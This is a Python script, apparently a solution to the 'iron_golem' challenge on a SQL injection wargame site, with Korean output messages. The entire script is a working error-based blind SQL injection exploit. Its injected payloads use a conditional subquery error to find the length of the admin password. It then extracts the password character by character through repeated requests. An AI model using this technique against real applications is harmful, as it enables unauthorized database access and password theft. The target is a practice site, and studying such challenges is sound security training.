# -*- coding: utf-8 -*-
import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="
head = {'Cookie' : 'PHPSESSID=값'}

length = 1
pwd = ''

while (1):
    query = "' or id='admin' and if(length(pw)={},1,(select 1 union select 2))%23".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "Subquery" in req.text:
        length += 1
    else:
        print("총 길이는",length)
        break

for i in range(1, length+1):
    for j in range(48, 122):
        query = "' or id='admin' and if(substr(pw,{},1)='{}',1,(select 1 union select 2))%23".format(str(i),chr(j))
        req = requests.get(url+query, headers=head)
        if "Subquery" not in req.text:
            pwd += chr(j)
            print(i,"번째 문자 찾는 중 .. : ",pwd)
            break
        
            
print("pw : ",pwd)